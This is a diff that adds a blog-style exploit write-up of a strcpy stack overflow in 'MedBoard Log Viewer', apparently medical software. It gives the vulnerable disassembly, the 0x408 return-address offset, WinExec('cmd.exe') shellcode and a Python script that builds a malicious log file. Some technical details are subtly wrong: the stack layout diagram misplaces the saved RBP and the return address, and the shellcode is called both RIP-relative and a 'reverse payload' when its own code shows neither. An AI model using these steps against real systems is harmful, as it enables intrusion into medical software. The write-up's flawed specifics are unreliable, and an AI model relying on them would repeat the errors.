@@ -1,0 +1,118 @@
+---
+title: "Buffer Backdoors: Stack Overflow in MedBoard Log Viewer (x64)"
+description: "An unsafe strcpy, a careless buffer, and a silent shell popping in a medical log viewer."
+date: '2025-04-18'
+categories: ["Reverse Engineering Diaries"]
+tags: ["Stack Overflow", "Shellcode", "Windows x64", "strcpy", "Reverse Engineering"]
+header:
+  image: "/images/medboard-buffer-overflow.jpg"
+---
+
+# **Prologue — Log Files, Late Nights & Loose Ends**
+
+There’s something ironic about a medical application having a vulnerability rooted in memory corruption. Here I was, poking through a piece of software called **MedBoard Log Viewer**, meant to keep records of system events, yet ironically blind to its own.
+
+I’d been examining its local log-handling behavior, triggered by a simple log import from an external file. What caught my eye wasn't just functionality—it was a particular way it handled copying data from memory into a local buffer. Specifically, I suspected the function responsible for the import was dangerously naive.
+
+---
+
+## **The Code Smell — strcpy Without Sanity**
+
+Digging into the disassembly, the function used to load logs went like this:
+
+```asm
+lea     rdi, [rbp-400h]        ; destination buffer (1KB local buffer)
+mov     rsi, [rbp+arg_0]       ; source input (log content from external file)
+call    strcpy                 ; unsafe copy
+```
+
+The moment I saw `strcpy` used on unbounded external data, my gut gave me that familiar tingle—the one you get right before a buffer overflows and execution flow goes rogue.
+
+This was a textbook stack-based buffer overflow vulnerability, wide open for exploitation.
+
+---
+
+## **The Stack Smash — Control Flow Takeover**
+
+The local buffer at `[rbp-400h]` was just a flat 1024 bytes. By feeding it a log file containing a payload that exceeded that size, I could overwrite the saved return pointer on the stack and hijack the execution.
+
+Here’s what the payload looked like, conceptually:
+
+```text
+[ padding (0x400 bytes) ]
+[ ROP filler or NOP sled ]
+[ Return address → shellcode start ]
+[ Shellcode ]
+```
+
+To confirm, I wrote a small test binary that simulated the same memory layout and replicated the crash, carefully measuring the offset to the return address. Once the overwrite location was clear, it was time for a payload.
+
+---
+
+## **Shellcode — A Quiet Call to `cmd.exe`**
+
+Rather than something loud, I wanted a minimalist reverse payload. A simple `cmd.exe` popup would do for POC. Here’s the core of what I injected into the vulnerable buffer:
+
+```asm
+mov     rcx, offset cmd_str
+call    WinExec
+
+cmd_str db "cmd.exe", 0
+```
+
+The shellcode was position-independent, using RIP-relative addressing to reach `cmd_str`. The goal? Prove I could hijack control and spawn a shell from within the process.
+
+---
+
+## **Execution Flow**
+
+Once the overflow occurred and the overwritten return address was hit, the app redirected to the start of my shellcode. `WinExec("cmd.exe", 1)` was called, and a command prompt spawned silently under the MedBoard process context.
+
+It worked beautifully. I’d taken over execution without touching the heap or leaving a trace in event logs.
+
+---
+
+## **Post Exploit Thoughts**
+
+There’s something poetic about exploiting a medical logger with a memory disorder.
+
+From a hacker’s standpoint, this wasn’t just about breaking in. It was about observing code behavior so carelessly written that it practically asked to be pwned. `strcpy` on untrusted input is the kind of vulnerability we were warned about *decades* ago, yet here it was, living in a production x64 Windows application.
+
+This exploit reminded me that **buffer overflows aren’t dead**. They're just hiding in legacy corners, waiting for the right payload and a curious mind.
+
+---
+
+## **Extra Code Insight — Stack Layout Visualization**
+
+Let’s break down the vulnerable function's stack layout:
+
+```text
+rbp-400h ---------------------------> [ Local buffer (1024 bytes) ]
+...
+rbp-8   ---------------------------> [ Saved RBP ]
+rbp     ---------------------------> [ Return address (overwritten) ]
+```
+
+If we craft an input of 0x408 bytes, we land exactly at the return address.
+
+---
+
+## **Final Payload Construction in Python**
+
+```python
+payload = b"A" * 0x408                 # padding to reach return address
+payload += b"\x90" * 16               # NOP sled
+payload += b"\x48\xB9..."            # shellcode (WinExec("cmd.exe"))
+with open("exploit_log.txt", "wb") as f:
+    f.write(payload)
+```
+
+This log file, when loaded by MedBoard Log Viewer, caused immediate redirection to our injected shellcode.
+
+---
+
+## **Lessons from the Stack**
+
+- Never trust legacy code to be safe, even in niche domains like medical software.
+- `strcpy` is always a red flag when handling external input.
+- Even in 2025, stack buffer overflows remain relevant.
